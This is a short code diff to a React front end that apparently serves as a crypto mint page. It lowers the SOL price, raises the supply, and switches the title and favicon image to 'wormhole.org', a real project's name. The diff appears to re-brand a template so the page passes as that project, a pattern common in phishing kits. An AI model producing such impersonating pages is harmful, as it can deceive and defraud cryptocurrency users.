@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = '0.3'
-const image = 'https://pbs.twimg.com/profile_images/1735684123052613632/gvBu0cQr_400x400.jpg'
-const Title = 'Only Bones DAO'
-const supply = 244
+const solAmount = '0.03'
+const image = 'https://pbs.twimg.com/profile_images/1668824685331779584/zXA6VMx5_400x400.jpg'
+const Title = 'wormhole.org'
+const supply = 2222
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
